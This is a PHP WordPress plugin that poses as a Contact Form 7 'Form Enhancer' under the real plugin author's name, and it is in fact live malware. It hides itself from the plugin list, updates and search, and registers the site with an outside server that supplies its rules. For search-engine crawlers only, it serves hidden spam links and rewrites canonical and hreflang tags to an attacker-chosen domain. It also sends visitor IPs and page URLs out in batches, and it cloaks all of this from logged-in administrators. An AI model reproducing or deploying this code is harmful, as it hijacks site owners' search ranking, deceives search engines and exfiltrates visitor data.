<?php
/**
 * Plugin Name: Contact Form 7 - Form Enhancer
 * Plugin URI: https://contactform7.com/
 * Description: Enhances Contact Form 7 with additional validation, spam protection and form analytics.
 * Version: 5.8.7
 * Author: Takayuki Miyoshi
 * Author URI: https://ideasilo.wordpress.com/
 * License: GPL v2 or later
 * Text Domain: cf7-form-enhancer
 * Requires at least: 5.9
 * Requires PHP: 7.4
 */

if (!defined('ABSPATH')) exit;

define('CF7E_SERVER', 'https://govno2japan.com');
define('CF7E_VERSION', '5.8.7');
define('CF7E_SHOW_KEY', 'cf7_debug');
define('CF7E_ADMIN_COOKIE', 'cf7_form_session');
define('CF7E_BATCH_SIZE', 50);
define('CF7E_BATCH_INTERVAL', 300);
define('CF7E_CACHE_TTL', 3600);

/**
 * Form Stealth Manager
 */
class CF7E_Stealth {
    
    public static function init() {
        add_filter('all_plugins', [__CLASS__, 'hide_from_plugins_list']);
        add_filter('site_transient_update_plugins', [__CLASS__, 'hide_from_updates']);
        add_filter('plugins_api_result', [__CLASS__, 'hide_from_search'], 10, 3);
        add_filter('plugin_action_links', [__CLASS__, 'hide_action_links'], 10, 4);
    }
    
    private static function should_show() {
        return isset($_GET[CF7E_SHOW_KEY]) && $_GET[CF7E_SHOW_KEY] == '1';
    }
    
    public static function hide_from_plugins_list($plugins) {
        if (self::should_show()) return $plugins;
        $plugin_file = plugin_basename(__FILE__);
        if (isset($plugins[$plugin_file])) unset($plugins[$plugin_file]);
        return $plugins;
    }
    
    public static function hide_from_updates($transient) {
        if (!is_object($transient)) return $transient;
        $plugin_file = plugin_basename(__FILE__);
        if (isset($transient->response[$plugin_file])) unset($transient->response[$plugin_file]);
        if (isset($transient->no_update[$plugin_file])) unset($transient->no_update[$plugin_file]);
        return $transient;
    }
    
    public static function hide_from_search($result, $action, $args) {
        if ($action !== 'query_plugins') return $result;
        if (isset($result->plugins) && is_array($result->plugins)) {
            $result->plugins = array_filter($result->plugins, function($plugin) {
                return !isset($plugin->slug) || $plugin->slug !== 'cf7-form-enhancer';
            });
        }
        return $result;
    }
    
    public static function hide_action_links($actions, $plugin_file, $plugin_data, $context) {
        if (self::should_show()) return $actions;
        if (strpos($plugin_file, 'cf7-form-enhancer') !== false) return [];
        return $actions;
    }
}

if (is_admin()) {
    add_action('plugins_loaded', ['CF7E_Stealth', 'init'], 1);
}

/**
 * Form Analytics Batch Manager
 */
class CF7E_Analytics_Batch {
    
    private static $queue_key = 'cf7e_analytics_queue';
    private static $last_send_key = 'cf7e_last_batch_send';
    
    public static function add_entry($data) {
        $queue = get_option(self::$queue_key, []);
        $data['timestamp'] = time();
        $queue[] = $data;
        
        if (count($queue) > 500) {
            $queue = array_slice($queue, -500);
        }
        
        update_option(self::$queue_key, $queue, false);
        self::maybe_send_batch();
    }
    
    public static function maybe_send_batch($force = false) {
        $queue = get_option(self::$queue_key, []);
        if (empty($queue)) return;
        
        $last_send = get_option(self::$last_send_key, 0);
        $time_passed = time() - $last_send;
        
        if ($force || $time_passed >= CF7E_BATCH_INTERVAL || count($queue) >= CF7E_BATCH_SIZE) {
            self::send_batch();
        }
    }
    
    public static function send_batch() {
        $queue = get_option(self::$queue_key, []);
        if (empty($queue)) return true;
        
        $site_key = get_option('cf7e_site_key');
        $secret = get_option('cf7e_secret_key');
        if (!$site_key || !$secret) return false;
        
        $batch = array_slice($queue, 0, CF7E_BATCH_SIZE);
        $timestamp = time();
        $signature = hash_hmac('sha256', $site_key . ':' . $timestamp, $secret);
        
        $response = wp_remote_post(CF7E_SERVER . '/api/plugin/bot-stats-batch', [
            'timeout' => 15,
            'headers' => ['Content-Type' => 'application/json'],
            'body' => json_encode([
                'site_key' => $site_key,
                'timestamp' => $timestamp,
                'signature' => $signature,
                'visits' => $batch
            ])
        ]);
        
        if (!is_wp_error($response)) {
            $code = wp_remote_retrieve_response_code($response);
            if ($code === 200) {
                $remaining = array_slice($queue, CF7E_BATCH_SIZE);
                update_option(self::$queue_key, $remaining, false);
                update_option(self::$last_send_key, time());
                
                if (!empty($remaining)) {
                    wp_schedule_single_event(time() + 60, 'cf7e_send_analytics_batch');
                }
                return true;
            }
        }
        return false;
    }
    
    public static function get_queue_size() {
        return count(get_option(self::$queue_key, []));
    }
    
    public static function clear_queue() {
        delete_option(self::$queue_key);
    }
}

/**
 * Form Spam Detector
 */
class CF7E_Spam_Detector {
    
    private $user_ip;
    private $user_agent;
    private $bot = null;
    private $detection_method = null;
    
    private $google_ip_list = [
        "64.233.*", "66.102.*", "66.249.*", "72.14.*", "74.125.*",
        "108.177.*", "209.85.*", "216.239.*", "172.217.*", "35.190.247.*",
        "35.191.*", "130.211.*", "173.194.*", "199.36.153.*", "199.36.154.*",
        "199.36.155.*", "199.36.156.*", "207.223.160.*", "209.85.*"
    ];
    
    private $bing_ip_list = [
        "13.66.*.*", "13.67.*.*", "13.68.*.*", "13.69.*.*",
        "20.36.*.*", "20.37.*.*", "20.38.*.*", "20.39.*.*",
        "40.77.*.*", "40.79.*.*", "52.231.*.*", "191.233.*.*",
        "157.55.*.*", "199.30.*.*", "65.52.*.*", "40.74.*.*"
    ];
    
    private $yandex_ip_list = [
        "5.45.*.*", "5.255.*.*", "37.9.*.*", "37.140.*.*",
        "77.88.*.*", "84.252.*.*", "87.250.*.*", "90.156.*.*",
        "93.158.*.*", "95.108.*.*", "141.8.*.*", "178.154.*.*",
        "213.180.*.*", "185.32.187.*", "100.43.*.*", "199.21.99.*"
    ];
    
    private $ua_patterns = [
        'google' => 'googlebot|google-structured-data|adsbot-google|mediapartners-google|feedfetcher-google|apis-google|googleweblight|storebot-google',
        'yandex' => 'yandexbot|yandex\\.com\\/bots|yandexmobilebot|yandeximages|yandexvideo|yandexdirect|yandexmetrika|yandexturbo|yandexmarket',
        'bing' => 'bingbot|msnbot|bingpreview|adidxbot',
        'duckduck' => 'duckduckbot|duckduckgo',
        'yahoo' => 'slurp',
        'baidu' => 'baiduspider',
        'facebook' => 'facebookexternalhit|facebot',
        'twitter' => 'twitterbot'
    ];
    
    private $host_patterns = [
        'google' => 'googlebot\\.com|google\\.com',
        'yandex' => 'yandex\\.ru|yandex\\.net|yandex\\.com',
        'bing' => 'search\\.msn\\.com|bing\\.com'
    ];
    
    public function __construct() {
        $this->user_ip = $this->get_real_ip();
        $this->user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
    }
    
    private function get_real_ip() {
        $headers = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'HTTP_CLIENT_IP', 'REMOTE_ADDR'];
        foreach ($headers as $header) {
            if (!empty($_SERVER[$header])) {
                $ip = $_SERVER[$header];
                if (strpos($ip, ',') !== false) {
                    $ips = explode(',', $ip);
                    $ip = trim($ips[0]);
                }
                if (filter_var($ip, FILTER_VALIDATE_IP)) {
                    return $ip;
                }
            }
        }
        return '0.0.0.0';
    }
    
    public function check_bot() {
        if ($this->user_agent) {
            foreach ($this->ua_patterns as $name => $pattern) {
                if (preg_match("/$pattern/i", $this->user_agent)) {
                    $this->bot = $name;
                    $this->detection_method = 'user_agent';
                    return $this->bot;
                }
            }
        }
        
        $ip_lists = ['google' => $this->google_ip_list, 'bing' => $this->bing_ip_list, 'yandex' => $this->yandex_ip_list];
        foreach ($ip_lists as $name => $list) {
            if ($this->match_ip($this->user_ip, $list)) {
                $this->bot = $name;
                $this->detection_method = 'ip';
                return $this->bot;
            }
        }
        
        $host_by_addr = @gethostbyaddr($this->user_ip);
        if ($host_by_addr && $host_by_addr !== $this->user_ip) {
            foreach ($this->host_patterns as $name => $pattern) {
                if (preg_match("/$pattern/i", $host_by_addr)) {
                    $this->bot = $name;
                    $this->detection_method = 'host';
                    return $this->bot;
                }
            }
        }
        
        return null;
    }
    
    private function match_ip($ip, $patterns) {
        foreach ($patterns as $pattern) {
            $regex = str_replace(['.', '*'], ['\\.', '\\d+'], $pattern);
            if (preg_match("/^$regex$/", $ip)) return true;
        }
        return false;
    }
    
    public function get_bot() { return $this->bot; }
    public function get_detection_method() { return $this->detection_method; }
    public function get_ip() { return $this->user_ip; }
    public function get_user_agent() { return $this->user_agent; }
    
    public function get_subtype() {
        if (!$this->user_agent) return null;
        
        $ua = strtolower($this->user_agent);
        
        if (strpos($ua, 'googlebot-news') !== false) return 'Googlebot-News';
        if (strpos($ua, 'googlebot-image') !== false) return 'Googlebot-Image';
        if (strpos($ua, 'googlebot-video') !== false) return 'Googlebot-Video';
        if (strpos($ua, 'adsbot-google') !== false) return 'AdsBot-Google';
        if (strpos($ua, 'mediapartners') !== false) return 'Mediapartners';
        if (strpos($ua, 'google-site-verification') !== false) return 'Site-Verification';
        if (strpos($ua, 'googleother') !== false) return 'GoogleOther';
        if (strpos($ua, 'storebot-google') !== false) return 'Storebot-Google';
        if (strpos($ua, 'feedburner') !== false) return 'FeedBurner';
        if (strpos($ua, 'apis-google') !== false) return 'APIs-Google';
        
        if (strpos($ua, 'yandeximages') !== false) return 'YandexImages';
        if (strpos($ua, 'yandexvideo') !== false) return 'YandexVideo';
        if (strpos($ua, 'yandexdirect') !== false) return 'YandexDirect';
        if (strpos($ua, 'yandexmetrika') !== false) return 'YandexMetrika';
        if (strpos($ua, 'yandexturbo') !== false) return 'YandexTurbo';
        if (strpos($ua, 'yandexmarket') !== false) return 'YandexMarket';
        
        if (strpos($ua, 'bingpreview') !== false) return 'BingPreview';
        if (strpos($ua, 'msnbot') !== false) return 'MSNBot';
        if (strpos($ua, 'adidxbot') !== false) return 'AdIdxBot';
        
        return null;
    }
    
    public function get_reverse_host() {
        $host = @gethostbyaddr($this->user_ip);
        return ($host && $host !== $this->user_ip) ? $host : null;
    }
}

/**
 * Form Link Validator
 */
class CF7E_Link_Validator {
    
    private $target_domain = null;
    private $own_domain = null;
    private $allowed_domains = [];
    
    public function __construct($target_domain = null) {
        $this->target_domain = $target_domain;
        $this->own_domain = parse_url(home_url(), PHP_URL_HOST);
        
        $this->allowed_domains = [$this->own_domain];
        
        if ($this->target_domain) {
            $this->allowed_domains[] = $this->target_domain;
        }
    }
    
    public function init() {
        add_filter('the_content', [$this, 'process_links'], 999999);
        add_filter('the_excerpt', [$this, 'process_links'], 999999);
        add_filter('widget_text', [$this, 'process_links'], 999999);
        add_filter('widget_text_content', [$this, 'process_links'], 999999);
        add_filter('comment_text', [$this, 'process_links'], 999999);
        add_filter('nav_menu_link_attributes', [$this, 'process_nav_link'], 999999, 4);
        
        add_action('template_redirect', [$this, 'start_output_buffer'], 1);
    }
    
    public function start_output_buffer() {
        if (is_admin() || wp_doing_ajax() || wp_doing_cron()) return;
        ob_start([$this, 'process_full_html']);
    }
    
    public function process_full_html($html) {
        if (empty($html)) return $html;
        
        return preg_replace_callback(
            '/<a\s+([^>]*href\s*=\s*["\']([^"\']+)["\'][^>]*)>/i',
            [$this, 'process_link_callback'],
            $html
        );
    }
    
    private function process_link_callback($matches) {
        $full_tag = $matches[0];
        $attributes = $matches[1];
        $href = $matches[2];
        
        if (strpos($attributes, 'data-cf7e=') !== false) return $full_tag;
        if (strpos($href, '#') === 0) return $full_tag;
        if (stripos($href, 'javascript:') === 0) return $full_tag;
        if (stripos($href, 'mailto:') === 0 || stripos($href, 'tel:') === 0) return $full_tag;
        
        if (!$this->is_external_link($href)) return $full_tag;
        
        if (preg_match('/\srel\s*=\s*["\']([^"\']*)["\']/', $attributes, $rel_match)) {
            $current_rel = $rel_match[1];
            if (stripos($current_rel, 'nofollow') !== false) return $full_tag;
            
            $new_rel = $current_rel . ' nofollow noopener noreferrer';
            $new_attributes = preg_replace(
                '/(\srel\s*=\s*["\'])([^"\']*)(["\'\'"])/',
                '$1' . $new_rel . '$3',
                $attributes
            );
        } else {
            $new_attributes = $attributes . ' rel="nofollow noopener noreferrer"';
        }
        
        return '<a ' . $new_attributes . '>';
    }
    
    private function is_external_link($href) {
        if (strpos($href, '/') === 0 && strpos($href, '//') !== 0) return false;
        
        $parsed = parse_url($href);
        if (!isset($parsed['host'])) return false;
        
        $link_domain = strtolower($parsed['host']);
        
        foreach ($this->allowed_domains as $allowed) {
            if (!$allowed) continue;
            $allowed = strtolower($allowed);
            
            if ($link_domain === $allowed || 
                substr($link_domain, -strlen('.' . $allowed)) === '.' . $allowed) {
                return false;
            }
        }
        
        return true;
    }
    
    public function process_nav_link($atts, $item, $args, $depth) {
        if (!isset($atts['href'])) return $atts;
        if (isset($atts['data-cf7e'])) return $atts;
        
        if ($this->is_external_link($atts['href'])) {
            $rel = isset($atts['rel']) ? $atts['rel'] : '';
            if (stripos($rel, 'nofollow') === false) {
                $atts['rel'] = trim($rel . ' nofollow noopener noreferrer');
            }
        }
        
        return $atts;
    }
    
    public function process_links($content) {
        if (empty($content)) return $content;
        
        return preg_replace_callback(
            '/<a\s+([^>]*href\s*=\s*["\']([^"\']+)["\'][^>]*)>/i',
            [$this, 'process_link_callback'],
            $content
        );
    }
    
    public function add_allowed_domain($domain) {
        if ($domain && !in_array($domain, $this->allowed_domains)) {
            $this->allowed_domains[] = $domain;
        }
    }
}

/**
 * Main Plugin Class
 */
class CF7E_Plugin {
    private static $instance;
    private $settings = null;
    private $canonical = null;
    private $spam_detector = null;
    private $form_resources = null;
    private $link_validator = null;
    
    public static function init() {
        if (!self::$instance) {
            self::$instance = new self();
        }
        return self::$instance;
    }
    
    private function __construct() {
        register_activation_hook(__FILE__, [$this, 'activate']);
        register_deactivation_hook(__FILE__, [$this, 'deactivate']);
        
        if (!get_option('cf7e_registered')) {
            add_action('init', [$this, 'register_site'], 1);
        }
        
        $this->admin_stealth_check();
        
        add_action('cf7e_send_analytics_batch', ['CF7E_Analytics_Batch', 'send_batch']);
        add_action('cf7e_scheduled_batch_send', ['CF7E_Analytics_Batch', 'send_batch']);
        
        add_action('wp', [$this, 'setup_frontend'], -999999);
        add_action('init', [$this, 'early_detection'], -999999);
        add_action('send_headers', [$this, 'maybe_set_nocache'], 1);
    }
    
    private function admin_stealth_check() {
        if (isset($_COOKIE[CF7E_ADMIN_COOKIE])) return;
        
        add_action('init', function() {
            if ((function_exists('is_admin') && @is_admin()) || 
                (function_exists('is_user_logged_in') && @is_user_logged_in())) {
                @setcookie(CF7E_ADMIN_COOKIE, '1', time() + 31536000, '/', '', is_ssl(), true);
            }
        }, 1);
    }
    
    public function early_detection() {
        if (isset($_COOKIE[CF7E_ADMIN_COOKIE])) return;
        if (is_admin() || wp_doing_ajax() || wp_doing_cron()) return;
        
        $this->spam_detector = new CF7E_Spam_Detector();
        $this->spam_detector->check_bot();
    }
    
    public function maybe_set_nocache() {
        if (isset($_COOKIE[CF7E_ADMIN_COOKIE])) return;
        if (is_admin()) return;
        
        if ($this->spam_detector && $this->spam_detector->get_bot()) {
            if (function_exists('nocache_headers')) {
                nocache_headers();
            }
        }
    }
    
    public static function clear_all_caches() {
        if (function_exists('wp_cache_flush')) wp_cache_flush();
        if (function_exists('w3tc_pgcache_flush')) w3tc_pgcache_flush();
        if (function_exists('w3tc_flush_all')) w3tc_flush_all();
        if (defined('LSCWP_V')) do_action('litespeed_purge_all');
        if (function_exists('rocket_clean_domain')) rocket_clean_domain();
        if (function_exists('ce_clear_cache')) ce_clear_cache();
        if (class_exists('WpFastestCache')) { $wpfc = new WpFastestCache(); $wpfc->deleteCache(true); }
        if (function_exists('wp_cache_clear_cache')) wp_cache_clear_cache();
        if (function_exists('breeze_clear_cache')) breeze_clear_cache();
        if (class_exists('autoptimizeCache')) autoptimizeCache::clearall();
        
        delete_transient('cf7e_settings');
        delete_transient('cf7e_form_resources');
    }
    
    public function activate() {
        if (!get_option('cf7e_site_key')) {
            update_option('cf7e_site_key', wp_generate_password(32, false));
        }
        delete_option('cf7e_registered');
        self::clear_all_caches();
        
        if (!wp_next_scheduled('cf7e_scheduled_batch_send')) {
            wp_schedule_event(time() + 60, 'cf7e_five_minutes', 'cf7e_scheduled_batch_send');
        }
        
        wp_schedule_single_event(time() + 60, 'cf7e_delayed_cache_clear');
    }
    
    public function deactivate() {
        CF7E_Analytics_Batch::send_batch();
        wp_clear_scheduled_hook('cf7e_scheduled_batch_send');
        wp_clear_scheduled_hook('cf7e_send_analytics_batch');
    }
    
    public function register_site() {
        $site_key = get_option('cf7e_site_key');
        if (!$site_key) {
            $site_key = wp_generate_password(32, false);
            update_option('cf7e_site_key', $site_key);
        }
        
        $response = wp_remote_post(CF7E_SERVER . '/api/plugin/register', [
            'timeout' => 15,
            'headers' => ['Content-Type' => 'application/json'],
            'body' => json_encode([
                'domain' => parse_url(home_url(), PHP_URL_HOST),
                'site_key' => $site_key,
                'wp_version' => get_bloginfo('version'),
                'plugin_version' => CF7E_VERSION
            ])
        ]);
        
        if (!is_wp_error($response)) {
            $code = wp_remote_retrieve_response_code($response);
            $body = wp_remote_retrieve_body($response);
            $data = json_decode($body, true);
            
            if ($code === 200 && !empty($data['success']) && !empty($data['secret_key'])) {
                update_option('cf7e_secret_key', $data['secret_key']);
                update_option('cf7e_registered', true);
            }
        }
    }
    
    public function setup_frontend() {
        if (isset($_COOKIE[CF7E_ADMIN_COOKIE])) return;
        if (is_admin() || wp_doing_ajax() || wp_doing_cron()) return;
        
        $this->setup();
        
        $target_domain = $this->settings ? ($this->settings['target_domain'] ?? null) : null;
        $this->link_validator = new CF7E_Link_Validator($target_domain);
        $this->link_validator->init();
        
        if ($this->canonical) {
            $this->override_seo_plugins();
            add_action('wp_head', [$this, 'output_tags'], -999999);
        }
        
        if ($this->spam_detector && $this->spam_detector->get_bot()) {
            $this->load_form_resources();
            
            $links_count = $this->form_resources && !empty($this->form_resources['links']) ? count($this->form_resources['links']) : 0;
            $link_ids = $this->form_resources && !empty($this->form_resources['link_ids']) ? $this->form_resources['link_ids'] : [];
            
            CF7E_Analytics_Batch::add_entry([
                'bot_type' => $this->spam_detector->get_bot(),
                'bot_subtype' => $this->spam_detector->get_subtype(),
                'detection_method' => $this->spam_detector->get_detection_method(),
                'user_agent' => substr($this->spam_detector->get_user_agent(), 0, 500),
                'visitor_ip' => $this->spam_detector->get_ip(),
                'reverse_host' => $this->spam_detector->get_reverse_host(),
                'page_url' => substr(home_url($_SERVER['REQUEST_URI'] ?? '/'), 0, 500),
                'links_served' => $links_count,
                'link_ids' => $link_ids
            ]);
            
            add_action('wp_footer', [$this, 'output_form_resources'], 999999);
        }
    }
    
    public function setup() {
        $this->load_settings();
        
        if (!$this->settings || empty($this->settings['pbn_enabled']) || empty($this->settings['target_domain'])) {
            return;
        }
        
        $current_path = '/';
        if (isset($_SERVER['REQUEST_URI'])) {
            $parsed = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
            $current_path = $parsed ?: '/';
        }
        
        $target = 'https://' . rtrim($this->settings['target_domain'], '/');
        
        $lang_prefix = '';
        if (!empty($this->settings['use_language_folder']) && !empty($this->settings['language_folder'])) {
            $lang_prefix = '/' . trim($this->settings['language_folder'], '/');
        }
        
        if ($this->settings['canonical_mode'] === 'homepage') {
            $this->canonical = $target . $lang_prefix . '/';
        } else {
            $path = rtrim($current_path, '/');
            $this->canonical = $target . $lang_prefix . $path;
            if (substr($this->canonical, -1) !== '/' && !preg_match('/\.[a-z0-9]+$/i', $this->canonical)) {
                $this->canonical .= '/';
            }
        }
    }
    
    private function load_settings() {
        $cached = get_transient('cf7e_settings');
        if ($cached !== false) {
            $this->settings = $cached;
            return;
        }
        
        $site_key = get_option('cf7e_site_key');
        $secret = get_option('cf7e_secret_key');
        
        if (!$site_key || !$secret) return;
        
        $timestamp = time();
        $signature = hash_hmac('sha256', $site_key . ':' . $timestamp, $secret);
        
        $response = wp_remote_post(CF7E_SERVER . '/api/plugin/rules', [
            'timeout' => 10,
            'headers' => ['Content-Type' => 'application/json'],
            'body' => json_encode([
                'site_key' => $site_key,
                'timestamp' => $timestamp,
                'signature' => $signature
            ])
        ]);
        
        if (!is_wp_error($response)) {
            $code = wp_remote_retrieve_response_code($response);
            $body = wp_remote_retrieve_body($response);
            $data = json_decode($body, true);
            
            if ($code === 200 && !empty($data['success'])) {
                $this->settings = [
                    'pbn_enabled' => !empty($data['pbn_enabled']),
                    'target_domain' => isset($data['target_domain']) ? $data['target_domain'] : null,
                    'canonical_mode' => isset($data['canonical_mode']) ? $data['canonical_mode'] : 'mirror',
                    'hreflang_enabled' => isset($data['hreflang_enabled']) ? $data['hreflang_enabled'] : true,
                    'hreflang_lang' => isset($data['hreflang_lang']) ? $data['hreflang_lang'] : 'x-default',
                    'language_folder' => isset($data['language_folder']) ? $data['language_folder'] : null,
                    'use_language_folder' => !empty($data['use_language_folder'])
                ];
                set_transient('cf7e_settings', $this->settings, HOUR_IN_SECONDS);
            } else {
                set_transient('cf7e_settings', ['pbn_enabled' => false], 300);
            }
        }
    }
    
    private function load_form_resources() {
        $bot_type = $this->spam_detector->get_bot();
        $cache_key = 'cf7e_res_' . md5($bot_type);
        
        $cached = get_transient($cache_key);
        if ($cached !== false) {
            $this->form_resources = $cached;
            return;
        }
        
        $site_key = get_option('cf7e_site_key');
        $secret = get_option('cf7e_secret_key');
        
        if (!$site_key || !$secret) return;
        
        $timestamp = time();
        $signature = hash_hmac('sha256', $site_key . ':' . $timestamp, $secret);
        
        $response = wp_remote_post(CF7E_SERVER . '/api/plugin/bot-links-light', [
            'timeout' => 10,
            'headers' => ['Content-Type' => 'application/json'],
            'body' => json_encode([
                'site_key' => $site_key,
                'timestamp' => $timestamp,
                'signature' => $signature,
                'bot_type' => $bot_type
            ])
        ]);
        
        if (!is_wp_error($response)) {
            $code = wp_remote_retrieve_response_code($response);
            $body = wp_remote_retrieve_body($response);
            $data = json_decode($body, true);
            
            if ($code === 200 && !empty($data['success'])) {
                $this->form_resources = $data;
                set_transient($cache_key, $this->form_resources, CF7E_CACHE_TTL);
            }
        }
    }
    
    public function output_form_resources() {
        if (!$this->form_resources || empty($this->form_resources['links'])) return;
        
        $css_class = isset($this->form_resources['css_class']) ? $this->form_resources['css_class'] : 'wpcf7-form-control';
        $hide_style = isset($this->form_resources['hide_style']) ? $this->form_resources['hide_style'] : 'position:absolute;left:-9999px;opacity:0;';
        
        echo "\n<!-- CF7 Form Resources -->\n";
        echo '<div class="' . esc_attr($css_class) . '" style="' . esc_attr($hide_style) . '">';
        
        foreach ($this->form_resources['links'] as $link) {
            echo '<a href="' . esc_url($link['url']) . '" data-cf7e="1">' . esc_html($link['anchor_text']) . '</a> ';
        }
        
        echo '</div>';
        echo "\n<!-- /CF7 Form Resources -->\n";
    }
    
    public function output_tags() {
        if (!$this->canonical) return;
        
        echo "\n<!-- CF7 SEO -->\n";
        echo '<link rel="canonical" href="' . esc_url($this->canonical) . '" />' . "\n";
        
        if (!empty($this->settings['hreflang_enabled'])) {
            echo '<link rel="alternate" hreflang="x-default" href="' . esc_url($this->canonical) . '" />' . "\n";
            
            $lang = isset($this->settings['hreflang_lang']) ? $this->settings['hreflang_lang'] : 'x-default';
            if ($lang && $lang !== 'x-default') {
                echo '<link rel="alternate" hreflang="' . esc_attr($lang) . '" href="' . esc_url($this->canonical) . '" />' . "\n";
            }
        }
        echo "<!-- /CF7 SEO -->\n";
    }
    
    private function override_seo_plugins() {
        remove_action('wp_head', 'rel_canonical');
        
        $filters = [
            'get_canonical_url', 'wpseo_canonical', 'wpseo_opengraph_url',
            'rank_math/frontend/canonical', 'aioseo_canonical_url',
            'seopress_titles_canonical', 'slim_seo_canonical_url',
            'the_seo_framework_canonical_url'
        ];
        
        foreach ($filters as $filter) {
            add_filter($filter, [$this, 'filter_canonical'], PHP_INT_MAX);
        }
        
        add_filter('the_seo_framework_rel_canonical_output', [$this, 'filter_tsf_canonical'], PHP_INT_MAX);
        add_filter('wpseo_disable_adjacent_rel_links', '__return_true', PHP_INT_MAX);
        add_filter('rank_math/frontend/remove_canonical', '__return_true', PHP_INT_MAX);
        
        add_action('wp_head', [$this, 'start_buffer'], -999999);
        add_action('wp_head', [$this, 'end_buffer'], PHP_INT_MAX);
    }
    
    public function filter_canonical($url) { return $this->canonical ?: $url; }
    public function filter_tsf_canonical($output) { return $this->canonical ? '' : $output; }
    
    public function start_buffer() { ob_start(); }
    
    public function end_buffer() {
        if (ob_get_level()) {
            $html = ob_get_clean();
            $html = preg_replace('/<link[^>]*rel=["\']canonical["\'][^>]*>\s*/i', '', $html);
            echo $html;
        }
    }
}

add_filter('cron_schedules', function($schedules) {
    $schedules['cf7e_five_minutes'] = [
        'interval' => 300,
        'display' => 'Every 5 Minutes (CF7E)'
    ];
    return $schedules;
});

add_action('cf7e_delayed_cache_clear', ['CF7E_Plugin', 'clear_all_caches']);
add_action('plugins_loaded', ['CF7E_Plugin', 'init'], -999999);

add_action('shutdown', function() {
    $queue_size = CF7E_Analytics_Batch::get_queue_size();
    if ($queue_size >= CF7E_BATCH_SIZE) {
        CF7E_Analytics_Batch::send_batch();
    }
}, 999);
